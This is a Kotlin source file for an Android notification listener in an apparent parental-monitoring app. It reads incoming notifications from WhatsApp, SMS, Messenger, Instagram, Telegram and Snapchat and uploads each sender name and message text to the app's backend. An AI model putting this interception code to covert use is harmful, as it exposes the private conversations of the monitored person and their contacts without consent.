package com.tgm.tgmc.core.services

import android.app.Notification
import android.service.notification.NotificationListenerService
import android.service.notification.StatusBarNotification
import android.util.Log
import com.tgm.tgmc.core.data.local.TgmcDataStore
import com.tgm.tgmc.core.data.remote.TgmcApiService
import dagger.hilt.android.AndroidEntryPoint
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.flow.firstOrNull
import kotlinx.coroutines.launch
import javax.inject.Inject

/**
 * Listens to incoming notifications on the child device.
 * Used to capture incoming chat messages (WhatsApp, SMS, etc.) and log them for the parent.
 */
@AndroidEntryPoint
class TgmcNotificationListener : NotificationListenerService() {

    @Inject lateinit var apiService: TgmcApiService
    @Inject lateinit var dataStore: TgmcDataStore
    private val scope = CoroutineScope(SupervisorJob() + Dispatchers.IO)

    companion object {
        private const val TAG = "TgmcNotifListener"
        // List of target messaging apps to monitor
        private val TARGET_APPS = listOf(
            "com.whatsapp",
            "com.google.android.apps.messaging", // Google Messages (SMS)
            "com.samsung.android.messaging", // Samsung SMS
            "com.facebook.orca", // Messenger
            "com.instagram.android", // Instagram DM
            "org.telegram.messenger", // Telegram
            "com.snapchat.android" // Snapchat
        )
    }

    override fun onNotificationPosted(sbn: StatusBarNotification?) {
        super.onNotificationPosted(sbn)
        if (sbn == null) return

        val packageName = sbn.packageName
        
        // Only process notifications from our target messaging apps
        if (!TARGET_APPS.contains(packageName)) return

        val extras = sbn.notification.extras
        val title = extras.getString(Notification.EXTRA_TITLE) // Usually the sender's name
        val text = extras.getCharSequence(Notification.EXTRA_TEXT)?.toString() // The message content

        if (title.isNullOrBlank() || text.isNullOrBlank()) return
        
        // Ignore "X new messages" summary notifications
        if (text.contains("new messages", ignoreCase = true) || text.contains("messages from", ignoreCase = true)) return

        Log.i(TAG, "Intercepted message from $packageName. Sender: $title")

        val appName = getAppNameFromPackage(packageName)

        scope.launch {
            val deviceId = dataStore.deviceId.firstOrNull() ?: return@launch
            
            try {
                // Post the intercepted message to the backend
                val request = mapOf(
                    "appName" to appName,
                    "sender" to title,
                    "content" to text,
                    "isIncoming" to true
                )
                apiService.logMessage(deviceId, request)
            } catch (e: Exception) {
                Log.e(TAG, "Failed to upload intercepted message: ${e.message}")
            }
        }
    }

    private fun getAppNameFromPackage(packageName: String): String {
        return when (packageName) {
            "com.whatsapp" -> "WhatsApp"
            "com.google.android.apps.messaging", "com.samsung.android.messaging" -> "SMS"
            "com.facebook.orca" -> "Messenger"
            "com.instagram.android" -> "Instagram"
            "org.telegram.messenger" -> "Telegram"
            "com.snapchat.android" -> "Snapchat"
            else -> packageName
        }
    }

    override fun onNotificationRemoved(sbn: StatusBarNotification?) {
        super.onNotificationRemoved(sbn)
        // Not used, but must be implemented
    }
}
